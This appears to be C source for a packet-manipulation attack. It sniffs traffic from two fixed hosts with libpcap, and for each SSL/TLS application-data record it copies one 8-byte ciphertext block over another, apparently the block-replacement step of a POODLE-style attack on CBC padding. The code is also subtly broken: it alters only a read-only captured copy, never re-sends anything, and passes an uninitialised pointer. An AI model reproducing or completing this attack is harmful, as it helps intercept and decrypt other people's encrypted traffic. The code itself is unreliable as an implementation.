#include <stdio.h>
#include <stdlib.h>
#include "sniff.h"


void 
Replace_Last_Block(char* msg)
{
  int i;

  for(i=32; i<=39; i++)
    {
      msg[i+40] = msg[i];
    }

}

/***** Callback unction *****/
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  const struct sniff_ethernet *ethernet; /* The ethernet header */
  const struct sniff_ip *ip; /* The IP header */
  const struct sniff_tcp *tcp; /* The TCP header */
  const struct sniff_ssl *ssl; /* The SSL header */
  const char *payload; /* Packet payload */

  u_int size_ip;
  u_int size_tcp;
  u_int size_ssl;

  ethernet = (struct sniff_ethernet*)(packet);
  ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
  size_ip = IP_HL(ip)*4;
  if (size_ip < 20) {
    printf("   * Invalid IP header length: %u bytes\n", size_ip);
    return;
  }
  tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
  size_tcp = TH_OFF(tcp)*4;
  if (size_tcp < 20) {
    printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
    return;
  }

  ssl = (struct sniff_ssl*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
  size_ssl = 5;
  
  payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp + size_ssl);

  if( ssl->ssl_type == 0x17 && ssl->ssl_length != 24)
    {
      Replace_Last_Block(payload);
    }
  
}


/*****       main       *****/
int main(int argc, char *argv[])
{
  char *dev;                    /* Device to sniff on */
  char errbuf[PCAP_ERRBUF_SIZE];/* Error string */
  pcap_t *handle;		/* Session handle */
  struct bpf_program fp;	/* The compiled filter expression */
  char filter_exp[] = "src 192.168.0.2 or src 172.16.0.2";/* The filter expression */
  bpf_u_int32 mask;		/* The netmask of our sniffing device */
  bpf_u_int32 net;		/* The IP of our sniffing device */
  u_char *packet;

  /* Define the device, eth0 will be taken by default */
  dev = pcap_lookupdev(errbuf);
  if (dev == NULL)
    {
      fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
      return(2);
    }
  printf("Device: %s\n", dev);

  /* Find the properties for the device */
  if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
    fprintf(stderr, "Can't get netmask for device %s\n", dev);
    net = 0;
    mask = 0;
  }

  /* Open the session in promiscuous mode */
  handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL)
    {
      fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
      return(2);
    }

  /* Compile and apply the filter */
  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
    fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
    return(2);
  }

  if (pcap_setfilter(handle, &fp) == -1) {
    fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
    return(2);
  }

  if (pcap_loop(handle,-1,got_packet,packet)< 0)
    {
      fprintf(stderr,"pcap_loop : %s\n",pcap_geterr(handle));
      exit(-1);
    }
  
  /* And close the session */
  pcap_close(handle);
  
  return(0);
}
